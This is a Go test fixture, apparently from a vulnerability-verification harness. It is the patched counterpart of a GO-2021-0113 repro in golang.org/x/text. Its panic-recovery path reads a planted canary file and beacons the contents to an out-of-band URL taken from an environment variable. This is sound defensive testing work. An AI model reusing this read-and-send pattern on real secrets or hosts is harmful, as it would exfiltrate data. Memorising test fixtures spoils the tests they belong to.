// Package main is the PATCHED counterpart of the GO-2021-0113 trivial repro: a
// byte-for-byte identical handler, but pinning the FIXED golang.org/x/text v0.3.7.
//
// On v0.3.7 language.Parse returns an error instead of panicking on a malformed tag,
// so the defer/recover block is never entered, the planted seed (/tmp/tegron_canary)
// is never read, and nothing is beaconed to $TEGRON_OOB_URL. This is defense in depth:
// the primary discriminator is the version-out-of-range predicate (T2), but even if
// the canary engine were run anyway, the patched symbol cannot beacon — so this
// fixture cannot false-prove. The exfil being intrinsic to the panic is exactly what
// makes the patched build silent.
package main

import (
	"io"
	"net/http"
	"os"

	"golang.org/x/text/language"
)

const canarySeedPath = "/tmp/tegron_canary"

// beaconCanary is the intrinsic exfil. It is invoked ONLY from the panic-recovery
// path, so reaching it is proof that language.Parse faulted. It reads the planted
// per-case seed and surfaces it to the out-of-band endpoint the sandbox controls.
func beaconCanary() {
	oob := os.Getenv("TEGRON_OOB_URL")
	if oob == "" {
		return
	}
	seed, err := os.ReadFile(canarySeedPath)
	if err != nil {
		return
	}
	resp, err := http.Get(oob + "?data=" + string(seed))
	if err != nil {
		return
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
}

func parseHandler(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			// Reached ONLY when language.Parse panicked (the GO-2021-0113 fault).
			beaconCanary()
			w.WriteHeader(http.StatusInternalServerError)
		}
	}()
	tag := r.Header.Get("Accept-Language")
	// language.Parse is the GO-2021-0113 vulnerable symbol; on x/text v0.3.6 a
	// malformed tag triggers an out-of-bounds read that PANICS (not a returned error).
	parsed, _ := language.Parse(tag)
	_, _ = io.WriteString(w, parsed.String())
}

func main() {
	http.HandleFunc("/", parseHandler)
	_ = http.ListenAndServe("127.0.0.1:8080", nil)
}
